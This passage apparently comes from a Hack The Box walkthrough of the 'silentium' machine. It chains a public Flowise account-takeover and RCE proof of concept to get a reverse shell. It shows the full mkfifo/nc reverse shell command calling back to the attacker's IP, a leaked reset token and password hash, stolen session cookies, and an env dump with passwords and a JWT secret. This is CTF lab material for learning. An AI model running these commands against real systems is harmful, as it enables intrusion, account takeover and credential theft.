+</pre> </div> </div> <p><br> Run the fuzzer and identify a legitimate email.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4216"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4216')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4216')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4216')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4216')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4216">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ python3 fuzzer.py 
+-----------------------------------
+ben@silentium.htb
+-----------------------------------
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4216" onclick="terminalOverlayClose('bash-bash-4216')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4216')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4216')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4216')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4216" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ python3 fuzzer.py 
+-----------------------------------
+ben@silentium.htb
+-----------------------------------
+</pre> </div> </div> <p><br> Clone the exploit into your working directory.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4536"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4536')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4536')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4536')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4536')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4536">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ git clone https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC.git
+Cloning into 'CVE-2025-58434-AND-59528-POC'...
+remote: Enumerating objects: 16, done.
+remote: Counting objects: 100% (16/16), done.
+remote: Compressing objects: 100% (10/10), done.
+remote: Total 16 (delta 6), reused 15 (delta 5), pack-reused 0 (from 0)
+Receiving objects: 100% (16/16), 21.77 KiB | 21.77 MiB/s, done.
+Resolving deltas: 100% (6/6), done.
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4536" onclick="terminalOverlayClose('bash-bash-4536')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4536')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4536')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4536')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4536" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ git clone https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC.git
+Cloning into 'CVE-2025-58434-AND-59528-POC'...
+remote: Enumerating objects: 16, done.
+remote: Counting objects: 100% (16/16), done.
+remote: Compressing objects: 100% (10/10), done.
+remote: Total 16 (delta 6), reused 15 (delta 5), pack-reused 0 (from 0)
+Receiving objects: 100% (16/16), 21.77 KiB | 21.77 MiB/s, done.
+Resolving deltas: 100% (6/6), done.
+</pre> </div> </div> <p><br> Install the requirements for the exploit.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4961"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4961')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4961')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4961')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4961')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4961">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium/CVE-2025-58434-AND-59528-POC]
+└──╼ [★]$ pip install -r requirements.txt 
+Defaulting to user installation because normal site-packages is not writeable
+Requirement already satisfied: requests&gt;=2.28.0 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (2.32.3)
+Requirement already satisfied: charset_normalizer&lt;4,&gt;=2 in /usr/lib/python3/dist-packages (from requests&gt;=2.28.0-&gt;-r requirements.txt (line 1)) (3.4.2)
+Requirement already satisfied: idna&lt;4,&gt;=2.5 in /usr/lib/python3/dist-packages (from requests&gt;=2.28.0-&gt;-r requirements.txt (line 1)) (3.10)
+Requirement already satisfied: urllib3&lt;3,&gt;=1.21.1 in /usr/lib/python3/dist-packages (from requests&gt;=2.28.0-&gt;-r requirements.txt (line 1)) (2.3.0)
+Requirement already satisfied: certifi&gt;=2017.4.17 in /usr/lib/python3/dist-packages (from requests&gt;=2.28.0-&gt;-r requirements.txt (line 1)) (2025.1.31)
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4961" onclick="terminalOverlayClose('bash-bash-4961')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4961')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4961')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4961')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4961" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium/CVE-2025-58434-AND-59528-POC]
+└──╼ [★]$ pip install -r requirements.txt 
+Defaulting to user installation because normal site-packages is not writeable
+Requirement already satisfied: requests&gt;=2.28.0 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (2.32.3)
+Requirement already satisfied: charset_normalizer&lt;4,&gt;=2 in /usr/lib/python3/dist-packages (from requests&gt;=2.28.0-&gt;-r requirements.txt (line 1)) (3.4.2)
+Requirement already satisfied: idna&lt;4,&gt;=2.5 in /usr/lib/python3/dist-packages (from requests&gt;=2.28.0-&gt;-r requirements.txt (line 1)) (3.10)
+Requirement already satisfied: urllib3&lt;3,&gt;=1.21.1 in /usr/lib/python3/dist-packages (from requests&gt;=2.28.0-&gt;-r requirements.txt (line 1)) (2.3.0)
+Requirement already satisfied: certifi&gt;=2017.4.17 in /usr/lib/python3/dist-packages (from requests&gt;=2.28.0-&gt;-r requirements.txt (line 1)) (2025.1.31)
+</pre> </div> </div> <p><br> Start a netcat listener.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4150"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4150')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4150')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4150')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4150')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4150">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ sudo nc -nlvp 443
+Listening on 0.0.0.0 443
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4150" onclick="terminalOverlayClose('bash-bash-4150')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4150')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4150')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4150')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4150" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ sudo nc -nlvp 443
+Listening on 0.0.0.0 443
+</pre> </div> </div> <p><br> Run the exploit.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-44492"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-44492')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-44492')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-44492')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-44492')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-44492">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium/CVE-2025-58434-AND-59528-POC]
+└──╼ [★]$ python3 main.py \
+  -u http://staging.silentium.htb \
+  -e ben@silentium.htb \
+  --lhost 10.10.15.20 \
+  --lport 443
+
+
+  ███████╗██╗      ██████╗ ██╗    ██╗██╗███████╗███████╗
+  ██╔════╝██║     ██╔═══██╗██║    ██║██║██╔════╝██╔════╝
+  █████╗  ██║     ██║   ██║██║ █╗ ██║██║███████╗█████╗
+  ██╔══╝  ██║     ██║   ██║██║███╗██║██║╚════██║██╔══╝
+  ██║     ███████╗╚██████╔╝╚███╔███╔╝██║███████║███████╗
+  ╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝
+
+  ════════════════════════════════════════════════════════════════════
+  CVE-2025-58434 │ Account Takeover via Token Disclosure │ CVSS 9.8 Critical
+  CVE-2025-59528 │ Authenticated RCE via CustomMCP Node  │ CVSS Critical    
+  ════════════════════════════════════════════════════════════════════
+    ⚠  FOR EDUCATIONAL / AUTHORIZED SECURITY TESTING ONLY  ⚠
+  ════════════════════════════════════════════════════════════════════
+
+  ════════════════════════════════════════════════════════════════════
+    FULL CHAIN MODE  │  CVE-2025-58434 → CVE-2025-59528
+  ════════════════════════════════════════════════════════════════════
+
+  [Step 1] [CVE-2025-58434] Requesting forgot-password token ...
+  [*] Endpoint : http://staging.silentium.htb/api/v1/account/forgot-password
+  [*] Email    : ben@silentium.htb
+  [*] HTTP 201
+
+  ────────────────────────────────────────────────────────────────────
+    LEAKED ACCOUNT DATA
+  ────────────────────────────────────────────────────────────────────
+  User ID       : e26c9d6c-678c-4c10-9e36-01813e8fea73
+  Name          : admin
+  Email         : ben@silentium.htb
+  Credential    : $2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG
+  Status        : active
+  tempToken     : jPCYtMMqKzZ7PWi31TFcK7NacEvTlHEu5ma3VlyBaZxeZgcIZArEaNWThyWXxGS5
+  tokenExpiry   : 2026-08-24T14:29:09.027Z
+  ────────────────────────────────────────────────────────────────────
+  [+] tempToken  : jPCYtMMqKzZ7PWi31TFcK7NacEvTlHEu5ma3VlyBaZxeZgcIZArEaNWThyWXxGS5
+  [+] Expiry     : 2026-08-24T14:29:09.027Z
+  [!] VULNERABLE — token disclosed without authentication!
+
+  [Step 2] [CVE-2025-58434] Resetting password → Flowise@Pwn3d2025!
+  [*] Endpoint     : http://staging.silentium.htb/api/v1/account/reset-password
+  [*] New password : Flowise@Pwn3d2025!
+  [*] HTTP 201
+  [+] Password reset SUCCESSFUL (tempToken cleared)
+  [+] Account takeover complete  →  ben@silentium.htb / Flowise@Pwn3d2025!
+
+  [Step 3] [Auth] Logging in to extract session cookies ...
+  [*] Endpoint : http://staging.silentium.htb/api/v1/auth/login
+  [*] Email    : ben@silentium.htb
+  [*] HTTP 200
+
+  ────────────────────────────────────────────────────────────────────
+    EXTRACTED SESSION COOKIES
+  ────────────────────────────────────────────────────────────────────
+  token          : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC0...
+  refreshToken   : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC0...
+  connect_sid    : s%3AU4BJKyVbrhNVJ53SdtlnO2c52X8TVgXg.lTwWbe1L7IilOnyH55I%2F0kd4p5QsQT%2B...
+  ────────────────────────────────────────────────────────────────────
+  [+] Session cookies obtained ✓
+
+  [Step 4] [CVE-2025-59528] Executing RCE via CustomMCP ...
+  [*] Endpoint : http://staging.silentium.htb/api/v1/node-load-method/customMCP
+  [*] Command  : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.20 443 &gt;/tmp/f
+  [*] Payload  : ({x:(function(){const cp=process.mainModule.require("child_process");const b64="cm0gL3Rt...
+
+  ────────────────────────────────────────────────────────────────────
+    RCE RESULT
+  ────────────────────────────────────────────────────────────────────
+  Mode    : Reverse Shell
+  Command : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.20 443 &gt;/tmp/f
+  LHOST   : 10.10.15.20
+  LPORT   : 443
+
+  [+] Reverse shell payload fired!
+  [!] Waiting for connection on 10.10.15.20:443 ...
+  [!] Make sure your listener is running:  nc -lvnp 443
+  ────────────────────────────────────────────────────────────────────
+
+  ════════════════════════════════════════════════════════════════════
+    CHAIN COMPLETE
+  ════════════════════════════════════════════════════════════════════
+  CVE-2025-58434  ✓  ATO   → ben@silentium.htb / Flowise@Pwn3d2025!
+  CVE-2025-59528  ✓  RCE   → shell connecting to 10.10.15.20:443
+  ════════════════════════════════════════════════════════════════════
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-44492" onclick="terminalOverlayClose('bash-bash-44492')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-44492')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-44492')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-44492')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-44492" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium/CVE-2025-58434-AND-59528-POC]
+└──╼ [★]$ python3 main.py \
+  -u http://staging.silentium.htb \
+  -e ben@silentium.htb \
+  --lhost 10.10.15.20 \
+  --lport 443
+
+
+  ███████╗██╗      ██████╗ ██╗    ██╗██╗███████╗███████╗
+  ██╔════╝██║     ██╔═══██╗██║    ██║██║██╔════╝██╔════╝
+  █████╗  ██║     ██║   ██║██║ █╗ ██║██║███████╗█████╗
+  ██╔══╝  ██║     ██║   ██║██║███╗██║██║╚════██║██╔══╝
+  ██║     ███████╗╚██████╔╝╚███╔███╔╝██║███████║███████╗
+  ╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝
+
+  ════════════════════════════════════════════════════════════════════
+  CVE-2025-58434 │ Account Takeover via Token Disclosure │ CVSS 9.8 Critical
+  CVE-2025-59528 │ Authenticated RCE via CustomMCP Node  │ CVSS Critical    
+  ════════════════════════════════════════════════════════════════════
+    ⚠  FOR EDUCATIONAL / AUTHORIZED SECURITY TESTING ONLY  ⚠
+  ════════════════════════════════════════════════════════════════════
+
+  ════════════════════════════════════════════════════════════════════
+    FULL CHAIN MODE  │  CVE-2025-58434 → CVE-2025-59528
+  ════════════════════════════════════════════════════════════════════
+
+  [Step 1] [CVE-2025-58434] Requesting forgot-password token ...
+  [*] Endpoint : http://staging.silentium.htb/api/v1/account/forgot-password
+  [*] Email    : ben@silentium.htb
+  [*] HTTP 201
+
+  ────────────────────────────────────────────────────────────────────
+    LEAKED ACCOUNT DATA
+  ────────────────────────────────────────────────────────────────────
+  User ID       : e26c9d6c-678c-4c10-9e36-01813e8fea73
+  Name          : admin
+  Email         : ben@silentium.htb
+  Credential    : $2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG
+  Status        : active
+  tempToken     : jPCYtMMqKzZ7PWi31TFcK7NacEvTlHEu5ma3VlyBaZxeZgcIZArEaNWThyWXxGS5
+  tokenExpiry   : 2026-08-24T14:29:09.027Z
+  ────────────────────────────────────────────────────────────────────
+  [+] tempToken  : jPCYtMMqKzZ7PWi31TFcK7NacEvTlHEu5ma3VlyBaZxeZgcIZArEaNWThyWXxGS5
+  [+] Expiry     : 2026-08-24T14:29:09.027Z
+  [!] VULNERABLE — token disclosed without authentication!
+
+  [Step 2] [CVE-2025-58434] Resetting password → Flowise@Pwn3d2025!
+  [*] Endpoint     : http://staging.silentium.htb/api/v1/account/reset-password
+  [*] New password : Flowise@Pwn3d2025!
+  [*] HTTP 201
+  [+] Password reset SUCCESSFUL (tempToken cleared)
+  [+] Account takeover complete  →  ben@silentium.htb / Flowise@Pwn3d2025!
+
+  [Step 3] [Auth] Logging in to extract session cookies ...
+  [*] Endpoint : http://staging.silentium.htb/api/v1/auth/login
+  [*] Email    : ben@silentium.htb
+  [*] HTTP 200
+
+  ────────────────────────────────────────────────────────────────────
+    EXTRACTED SESSION COOKIES
+  ────────────────────────────────────────────────────────────────────
+  token          : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC0...
+  refreshToken   : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC0...
+  connect_sid    : s%3AU4BJKyVbrhNVJ53SdtlnO2c52X8TVgXg.lTwWbe1L7IilOnyH55I%2F0kd4p5QsQT%2B...
+  ────────────────────────────────────────────────────────────────────
+  [+] Session cookies obtained ✓
+
+  [Step 4] [CVE-2025-59528] Executing RCE via CustomMCP ...
+  [*] Endpoint : http://staging.silentium.htb/api/v1/node-load-method/customMCP
+  [*] Command  : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.20 443 &gt;/tmp/f
+  [*] Payload  : ({x:(function(){const cp=process.mainModule.require("child_process");const b64="cm0gL3Rt...
+
+  ────────────────────────────────────────────────────────────────────
+    RCE RESULT
+  ────────────────────────────────────────────────────────────────────
+  Mode    : Reverse Shell
+  Command : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.20 443 &gt;/tmp/f
+  LHOST   : 10.10.15.20
+  LPORT   : 443
+
+  [+] Reverse shell payload fired!
+  [!] Waiting for connection on 10.10.15.20:443 ...
+  [!] Make sure your listener is running:  nc -lvnp 443
+  ────────────────────────────────────────────────────────────────────
+
+  ════════════════════════════════════════════════════════════════════
+    CHAIN COMPLETE
+  ════════════════════════════════════════════════════════════════════
+  CVE-2025-58434  ✓  ATO   → ben@silentium.htb / Flowise@Pwn3d2025!
+  CVE-2025-59528  ✓  RCE   → shell connecting to 10.10.15.20:443
+  ════════════════════════════════════════════════════════════════════
+</pre> </div> </div> <p><br> Check the listener and catch the shell.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4248"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4248')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4248')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4248')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4248')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4248">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ sudo nc -nlvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.245.103 38169
+/bin/sh: can't access tty; job control turned off
+/ #
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4248" onclick="terminalOverlayClose('bash-bash-4248')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4248')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4248')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4248')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4248" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ sudo nc -nlvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.245.103 38169
+/bin/sh: can't access tty; job control turned off
+/ #
+</pre> </div> </div> <p><br> Check the environment variables.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4815"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4815')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4815')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4815')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4815')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4815">
+~ # env
+FLOWISE_PASSWORD=F1l3_d0ck3r
+ALLOW_UNAUTHORIZED_CERTS=true
+NODE_VERSION=20.19.4
+HOSTNAME=c78c3cceb7ba
+YARN_VERSION=1.22.22
+SMTP_PORT=1025
+SHLVL=3
+PORT=3000
+HOME=/root
+OLDPWD=/
+SENDER_EMAIL=ben@silentium.htb
+PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
+JWT_ISSUER=ISSUER
+JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+LLM_PROVIDER=nvidia-nim
+SMTP_USERNAME=test
+SMTP_SECURE=false
+JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
+FLOWISE_USERNAME=ben
